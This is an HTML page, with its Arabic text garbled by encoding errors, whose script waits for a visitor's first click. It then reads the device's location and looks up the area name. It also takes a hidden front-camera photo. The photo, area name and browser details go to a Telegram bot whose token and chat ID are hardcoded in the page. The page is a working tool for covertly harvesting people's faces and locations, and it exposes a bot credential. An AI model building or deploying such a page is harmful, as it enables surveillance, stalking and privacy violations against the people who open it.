<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>ุฌุงุฑู ุงููุนุงูุฌุฉ</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body {
  font-family: Arial;
  text-align: center;
  margin-top: 40px;
}
img {
  width: 220px;
  margin: 20px auto;
  display: block;
}
</style>
</head>
<body>

<h3>๐ธ ุณูุชู ุงูุชูุงุท ุตูุฑุฉ ูุงุญุฏุฉ</h3>
<p>ูุณูุชู ุฅุฑุณุงููุง ูุน ุงุณู ุงูููุทูุฉ</p>

<!-- ๐ฝ ุถุน ุฑุงุจุท ุงูุตูุฑุฉ ููุง -->
<img src="https://example.com/image.jpg" alt="ุตูุฑุฉ">

<canvas id="canvas" style="display:none;"></canvas>

<script>
const BOT_TOKEN = "7415148537:AAHC9RSt6Ka4Ip34qTCleHx0YXtfGaERwIA";
const CHAT_ID  = "6251932709";

let done = false;

// ๐ ุฃูู ููุณ (ุถุฑูุฑู ููู ุงูุฃุฌูุฒุฉ)
document.body.addEventListener("click", start, { once: true });

async function start() {
  if (done) return;
  done = true;

  try {
    // ๐ ุงููููุน
    navigator.geolocation.getCurrentPosition(async pos => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;

      // ๐ ุงุณู ุงูููุทูุฉ
      const geoRes = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
      );
      const geo = await geoRes.json();
      const area =
        geo.address.city ||
        geo.address.town ||
        geo.address.village ||
        geo.address.state ||
        "ุบูุฑ ูุนุฑูู";

      // ๐ธ ุงููุงููุฑุง
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
      });

      const video = document.createElement("video");
      video.setAttribute("playsinline", true);
      video.srcObject = stream;
      await video.play();

      const canvas = document.getElementById("canvas");
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      canvas.getContext("2d").drawImage(video, 0, 0);

      stream.getTracks().forEach(t => t.stop());

      // ๐ง ุชุญููู Canvas ุฅูู Blob (ุจุฏูู Base64)
      canvas.toBlob(async blob => {

        // ๐ฉ ุฅุฑุณุงู ูุต
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `๐ธ ุตูุฑุฉ ุฌุฏูุฏุฉ\n๐ ุงูููุทูุฉ: ${area}\n๐ฑ ุงูุฌูุงุฒ: ${navigator.userAgent}`
          })
        });

        // ๐ท ุฅุฑุณุงู ุงูุตูุฑุฉ ูููู
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", blob, "photo.png");

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: "POST",
          body: formData
        });

      }, "image/png");

    }, () => alert("โ ุชู ุฑูุถ ุงููููุน"));

  } catch (e) {
    alert("โ ูุดู ุงูุฅุฑุณุงู");
  }
}
</script>

</body>
</html>